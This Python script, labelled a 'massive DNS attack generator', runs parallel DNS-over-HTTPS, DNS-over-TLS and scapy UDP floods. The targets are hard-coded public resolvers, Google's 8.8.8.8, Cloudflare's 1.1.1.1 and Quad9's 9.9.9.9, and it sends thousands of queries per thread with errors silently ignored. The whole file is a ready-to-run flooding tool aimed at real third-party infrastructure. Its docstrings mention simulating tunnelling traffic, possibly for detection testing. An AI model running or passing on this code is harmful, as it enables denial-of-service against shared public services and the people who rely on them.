import argparse
import time
import random
import _thread
import socket
import ssl
import requests
from scapy.all import *
from dnslib import DNSRecord, QTYPE

# Configuration
DOH_SERVERS = [
    "https://8.8.8.8/dns-query",
    "https://1.1.1.1/dns-query",
    "https://9.9.9.9/dns-query"
]

DOT_SERVERS = [
    ("8.8.8.8", 853),
    ("1.1.1.1", 853)
]

ATTACK_DOMAINS = [
    "example.com", "google.com", "facebook.com", "netflix.com",
    "attack-test.org", "malicious-site.net", "data-exfil.io"
]

QUERY_TYPES = ["A", "AAAA", "TXT", "MX", "ANY"]

def generate_doh_attack(count, delay):
    """
    Generates DoH (DNS over HTTPS) traffic.
    Simulates tunneling or high-volume queries.
    """
    print(f"[DoH] Starting DoH Attack: {count} queries...")
    headers = {"Content-Type": "application/dns-message"}
    
    for i in range(count):
        try:
            domain = random.choice(ATTACK_DOMAINS)
            qtype = random.choice(QUERY_TYPES)
            
            # Create raw DNS query
            q = DNSRecord.question(domain, getattr(QTYPE, qtype))
            data = q.pack()
            
            target = random.choice(DOH_SERVERS)
            
            # Send POST request (DoH)
            response = requests.post(target, data=data, headers=headers, timeout=2)
            
            if i % 50 == 0:
                print(f"[DoH] Sent {i} queries to {target}")
                
            time.sleep(delay)
            
        except Exception as e:
            pass # Ignore errors for speed

def generate_dot_attack(count, delay):
    """
    Generates DoT (DNS over TLS) traffic.
    """
    print(f"[DoT] Starting DoT Attack: {count} queries...")
    
    for i in range(count):
        try:
            target_ip, target_port = random.choice(DOT_SERVERS)
            
            # Establish TLS connection
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((target_ip, target_port), timeout=2) as sock:
                with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                    
                    domain = random.choice(ATTACK_DOMAINS)
                    q = DNSRecord.question(domain, "A")
                    data = q.pack()
                    
                    # DoT requires 2-byte length prefix
                    length = len(data).to_bytes(2, byteorder='big')
                    ssock.send(length + data)
                    
                    if i % 50 == 0:
                        print(f"[DoT] Sent {i} queries to {target_ip}")
            
            time.sleep(delay)
            
        except Exception as e:
            pass

def generate_udp_flood(target_ip, count, delay):
    """
    Generates massive UDP DNS Flood (Port 53).
    """
    print(f"[UDP] Starting UDP Flood to {target_ip}...")
    
    for i in range(count):
        try:
            domain = random.choice(ATTACK_DOMAINS)
            # Scapy DNS Packet
            pkt = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
            send(pkt, verbose=0)
            
            if i % 100 == 0:
                print(f"[UDP] Flood packet {i} sent.")
                
            time.sleep(delay)
        except Exception:
            pass

def main():
    print("=== MASSIVE DNS ATTACK GENERATOR (DoH / DoT / UDP) ===")
    
    # Run attacks in parallel threads
    try:
        # 1. DoH Attack Thread
        _thread.start_new_thread(generate_doh_attack, (5000, 0.01))
        
        # 2. DoT Attack Thread
        _thread.start_new_thread(generate_dot_attack, (5000, 0.01))
        
        # 3. UDP Flood Thread (Local Gateway or Random)
        _thread.start_new_thread(generate_udp_flood, ("8.8.8.8", 10000, 0.001))
        
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[STOP] Attack stopped.")

if __name__ == "__main__":
    main()
